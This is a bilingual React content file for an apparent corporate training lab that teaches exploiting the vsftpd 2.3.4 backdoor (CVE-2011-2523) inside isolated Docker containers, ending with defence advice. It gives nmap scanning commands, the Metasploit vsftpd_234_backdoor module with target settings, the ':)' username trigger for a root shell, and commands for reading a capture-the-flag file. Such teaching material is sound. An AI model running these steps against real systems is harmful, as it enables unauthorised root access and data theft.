import React from 'react';
import { AppContent } from './types';
import { LabSetupDiagram, ScanningDiagram, MetasploitDiagram } from './components/Visuals';

// Lab variables for the VSFTPD scenario
const LAB_VARS = {
  SUBNET: "172.19.0.0/24",
  KALI_IP: "172.19.0.2",
  TARGET_IP: "172.19.0.3"
};

export const CONTENT: Record<'en' | 'nl', AppContent> = {
  en: {
    header: {
      title: "Exploitation & Backdoors Lab",
      subtitle: "Identifying and Exploiting Legacy Vulnerabilities (CVE-2011-2523)",
      badge: "ING Factory • Cybersecurity Lab Part 2"
    },
    challenges: [
      {
        id: 0,
        title: "Connecting to Your Lab Environment",
        difficulty: "BEGINNER",
        theory: {
          title: "The Attack Setup",
          content: "Before we can start learning about security, we need to connect to our practice environment. We have set up two containers using Docker: a **Kali Linux** machine (your attacker) and a **Vulnerable Target** machine.",
          analogy: "Think of this like logging into a dedicated computer that's specially set up for safe learning, completely isolated from your real computer.",
          visual: <LabSetupDiagram />
        },
        realWorld: {
          title: "Why Kali Linux?",
          description: "Kali Linux is the industry standard OS for penetration testing. It comes pre-packaged with over 600 security tools.",
          scenario: "Security professionals use specialized environments like this to ensure their testing tools don't accidentally affect production systems or their personal workstations."
        },
        task: {
          title: "Initialize Connection",
          steps: [
            {
              label: "1. Connect to your Kali Linux container from your terminal:",
              command: "docker exec -it kali bash",
              context: "Host Terminal"
            },
            {
              label: "2. Verify your identity and location:",
              command: "whoami && ip addr",
              output: `root\ninet ${LAB_VARS.KALI_IP}/16 ...`,
              context: "root@kali"
            }
          ]
        },
        hints: [
          {
            title: "What is Docker?",
            type: "setup",
            content: "Think of Docker like having multiple computers inside your computer. Each 'container' is like a separate, isolated computer that can't affect your real computer."
          },
          {
            title: "ING Context",
            type: "ing",
            content: "ING uses containers heavily in the ICHP Environment. This allows us to be agile in our service offerings while maintaining strict isolation for security."
          }
        ]
      },
      {
        id: 1,
        title: "Discovering Network Services",
        difficulty: "BEGINNER",
        theory: {
          title: "Network Reconnaissance",
          content: "We need to find out what services are running on the target machine. We use **Nmap** (Network Mapper) to discover active hosts and open ports. We are looking for anything unusual or outdated.",
          analogy: "Imagine you're in a hotel hallway. Network scanning is like looking at each door to see which rooms exist and which have people inside.",
          visual: <ScanningDiagram />
        },
        realWorld: {
          title: "The Recon Phase",
          description: "Attackers never strike blindly. They spend 80% of their time mapping the network to find the weakest link.",
          scenario: "In this case, we will find an old FTP server. FTP transmits data in cleartext and old versions often have severe vulnerabilities."
        },
        task: {
          title: "Scan the Network",
          steps: [
            {
              label: "1. Discover active machines on the network:",
              command: `nmap -sn ${LAB_VARS.SUBNET}`,
              output: `Nmap scan report for badweb.demo (${LAB_VARS.TARGET_IP})\nHost is up.`,
              context: "root@kali"
            },
            {
              label: "2. Run a detailed service scan on the target:",
              command: `nmap -sV -p 1-100 --script vulners ${LAB_VARS.TARGET_IP}`,
              output: `PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\n| vulners:\n|   vsftpd 2.3.4:\n|       CVE-2011-2523 10.0`,
              context: "root@kali"
            }
          ]
        },
        hints: [
          {
            title: "Understanding Nmap",
            type: "info",
            content: "`nmap -sn` performs a 'ping scan' to just check who is alive. `-sV` probes open ports to determine service/version info. `--script vulners` checks those versions against a database of known hacks."
          },
          {
            title: "What did we find?",
            type: "solution",
            content: "We found **vsftpd 2.3.4** running on port 21. The scan output explicitly mentions **CVE-2011-2523**, which is a critical backdoor vulnerability."
          }
        ]
      },
      {
        id: 2,
        title: "Exploiting the Backdoor",
        difficulty: "INTERMEDIATE",
        theory: {
          title: "CVE-2011-2523 Explained",
          content: "This specific version of vsftpd contained a malicious backdoor introduced by a hacker into the source code. If a user logs in with a username ending in `:)` (a smiley face), the server opens a root shell on port 6200.",
          analogy: "It's like a bank vault that opens automatically if you simply smile at the security camera, bypassing all keys and codes.",
          visual: <MetasploitDiagram />
        },
        realWorld: {
          title: "Supply Chain Attacks",
          description: "This was a famous 'Supply Chain Attack' where the official software distribution was compromised.",
          scenario: "We will use **Metasploit**, a powerful penetration testing framework, to automate the process of triggering this backdoor and gaining control."
        },
        task: {
          title: "Launch the Attack",
          steps: [
            {
              label: "1. Start Metasploit Framework:",
              command: "msfconsole -q",
              context: "root@kali"
            },
            {
              label: "2. Configure and launch the exploit:",
              context: "msf6 >",
              tabs: [
                {
                  label: "Commands",
                  command: `use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS ${LAB_VARS.TARGET_IP}\nexploit`
                }
              ],
              output: `[*] Found shell.\n[*] Command shell session 1 opened`
            },
            {
              label: "3. Verify Root Access & Find the Flag:",
              command: "whoami\ncd /home/socrates/Documents\ncat bank.txt",
              output: `root\nFLAG{B4nk_D3t41l_F0und_GG}\nUsername: ing_user`,
              context: "Shell"
            }
          ]
        },
        hints: [
          {
            title: "What is Metasploit?",
            type: "setup",
            content: "Metasploit is the 'Swiss Army Knife' of hacking. It contains thousands of pre-written exploits. `use` selects a tool, `set RHOSTS` tells it where to aim, and `exploit` pulls the trigger."
          },
          {
            title: "Finding the Flag",
            type: "solution",
            content: "Once you have a shell, you are 'inside' the target computer. You use standard Linux commands like `ls` (list files) and `cd` (change directory) to look around. We found credentials in the Documents folder."
          }
        ]
      }
    ],
    completion: {
      title: "Exploitation Lab Complete!",
      badge: "Vulnerability Hunter",
      learnedTitle: "Key Takeaways:",
      learnedPoints: [
        "Network reconnaissance with Nmap is the first step of any attack",
        "Legacy software (vsftpd 2.3.4) often contains critical vulnerabilities",
        "How to use Metasploit to automate complex exploits",
        "The danger of Supply Chain Attacks"
      ],
      applyTitle: "Defense Strategies:",
      applyPoints: [
        "Keep all software updated to the latest stable versions",
        "Monitor network traffic for unusual ports (like 6200)",
        "Use Software Composition Analysis (SCA) to check for compromised dependencies",
        "Disable unused services (like FTP) and use secure alternatives (SFTP)"
      ]
    }
  },
  nl: {
    header: {
      title: "Exploitatie & Backdoors Lab",
      subtitle: "Oude Kwetsbaarheden Identificeren en Misbruiken (CVE-2011-2523)",
      badge: "ING Factory • Cybersecurity Lab Deel 2"
    },
    challenges: [
      {
        id: 0,
        title: "Verbinding maken met je Lab",
        difficulty: "BEGINNER",
        theory: {
          title: "De Aanvalsopzet",
          content: "Voordat we kunnen beginnen, moeten we verbinding maken met onze oefenomgeving. We hebben twee containers opgezet: een **Kali Linux** machine (jouw aanvaller) en een **Kwetsbaar Doelwit**.",
          analogy: "Zie dit als inloggen op een speciale computer die veilig is opgezet om te leren, volledig geïsoleerd van je echte computer.",
          visual: <LabSetupDiagram />
        },
        realWorld: {
          title: "Waarom Kali Linux?",
          description: "Kali Linux is de industriestandaard voor penetratietesten. Het bevat meer dan 600 beveiligingstools.",
          scenario: "Beveiligingsprofessionals gebruiken dit soort omgevingen om ervoor te zorgen dat hun tests geen productiesystemen raken."
        },
        task: {
          title: "Verbinding Initialiseren",
          steps: [
            {
              label: "1. Verbind met je Kali Linux container:",
              command: "docker exec -it kali bash",
              context: "Host Terminal"
            },
            {
              label: "2. Verifieer je identiteit:",
              command: "whoami && ip addr",
              output: `root\ninet ${LAB_VARS.KALI_IP}/16 ...`,
              context: "root@kali"
            }
          ]
        },
        hints: [
          {
            title: "Wat is Docker?",
            type: "setup",
            content: "Zie Docker als meerdere computers binnen je computer. Elke 'container' is geïsoleerd."
          },
          {
            title: "ING Context",
            type: "ing",
            content: "ING gebruikt containers veel in de ICHP-omgeving. Dit stelt ons in staat wendbaar te zijn met behoud van strikte isolatie."
          }
        ]
      },
      {
        id: 1,
        title: "Netwerkdiensten Ontdekken",
        difficulty: "BEGINNER",
        theory: {
          title: "Netwerkverkenning",
          content: "We moeten ontdekken welke diensten er draaien. We gebruiken **Nmap** om actieve hosts en open poorten te vinden. We zoeken naar alles wat ongebruikelijk of verouderd is.",
          analogy: "Stel je een hotelgang voor. Netwerkscannen is als kijken naar elke deur om te zien welke kamers bestaan en waar mensen zijn.",
          visual: <ScanningDiagram />
        },
        realWorld: {
          title: "De Verkenningsfase",
          description: "Aanvallers slaan nooit blindelings toe. Ze besteden 80% van hun tijd aan het in kaart brengen van het netwerk.",
          scenario: "In dit geval vinden we een oude FTP-server. FTP verstuurt data in platte tekst en oude versies zijn vaak lek."
        },
        task: {
          title: "Scan het Netwerk",
          steps: [
            {
              label: "1. Ontdek actieve machines:",
              command: `nmap -sn ${LAB_VARS.SUBNET}`,
              output: `Nmap scan report for badweb.demo (${LAB_VARS.TARGET_IP})\nHost is up.`,
              context: "root@kali"
            },
            {
              label: "2. Voer een gedetailleerde service scan uit:",
              command: `nmap -sV -p 1-100 --script vulners ${LAB_VARS.TARGET_IP}`,
              output: `PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\n| vulners:\n|   vsftpd 2.3.4:\n|       CVE-2011-2523 10.0`,
              context: "root@kali"
            }
          ]
        },
        hints: [
          {
            title: "Nmap Begrijpen",
            type: "info",
            content: "`nmap -sn` kijkt wie er levend is. `-sV` controleert serviceversies. `--script vulners` checkt deze versies tegen een database van bekende hacks."
          },
          {
            title: "Wat hebben we gevonden?",
            type: "solution",
            content: "We vonden **vsftpd 2.3.4** op poort 21. De scanoutput noemt expliciet **CVE-2011-2523**, een kritieke backdoor."
          }
        ]
      },
      {
        id: 2,
        title: "De Backdoor Misbruiken",
        difficulty: "INTERMEDIATE",
        theory: {
          title: "CVE-2011-2523 Uitgelegd",
          content: "Deze versie van vsftpd bevatte een kwaadaardige backdoor. Als een gebruiker inlogt met een naam eindigend op `:)`, opent de server een root shell op poort 6200.",
          analogy: "Het is als een bankkluis die open gaat als je naar de beveiligingscamera glimlacht.",
          visual: <MetasploitDiagram />
        },
        realWorld: {
          title: "Supply Chain Aanvallen",
          description: "Dit was een beroemde 'Supply Chain Attack' waarbij de officiële software werd gehackt.",
          scenario: "We gebruiken **Metasploit** om dit proces te automatiseren en controle te krijgen."
        },
        task: {
          title: "Start de Aanval",
          steps: [
            {
              label: "1. Start Metasploit Framework:",
              command: "msfconsole -q",
              context: "root@kali"
            },
            {
              label: "2. Configureer en start de exploit:",
              context: "msf6 >",
              tabs: [
                {
                  label: "Commando's",
                  command: `use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS ${LAB_VARS.TARGET_IP}\nexploit`
                }
              ],
              output: `[*] Found shell.\n[*] Command shell session 1 opened`
            },
            {
              label: "3. Verifieer Root Toegang & Vind de Vlag:",
              command: "whoami\ncd /home/socrates/Documents\ncat bank.txt",
              output: `root\nFLAG{B4nk_D3t41l_F0und_GG}\nUsername: ing_user`,
              context: "Shell"
            }
          ]
        },
        hints: [
          {
            title: "Wat is Metasploit?",
            type: "setup",
            content: "Metasploit is het 'Zwitsers Zakmes' van hacken. `use` selecteert een tool, `set RHOSTS` richt het, en `exploit` haalt de trekker over."
          },
          {
            title: "De Vlag Vinden",
            type: "solution",
            content: "Eenmaal binnen ben je 'in' de computer. Gebruik standaard Linux commando's zoals `ls` en `cd` om rond te kijken."
          }
        ]
      }
    ],
    completion: {
      title: "Exploitatie Lab Voltooid!",
      badge: "Vulnerability Hunter",
      learnedTitle: "Belangrijkste lessen:",
      learnedPoints: [
        "Netwerkverkenning met Nmap is de eerste stap",
        "Oude software (vsftpd 2.3.4) bevat vaak lekken",
        "Hoe Metasploit complexe exploits automatiseert",
        "Het gevaar van Supply Chain Attacks"
      ],
      applyTitle: "Verdedigingsstrategieën:",
      applyPoints: [
        "Houd alle software up-to-date",
        "Monitor netwerkverkeer op vreemde poorten (zoals 6200)",
        "Gebruik Software Composition Analysis (SCA)",
        "Schakel ongebruikte diensten uit"
      ]
    }
  }
};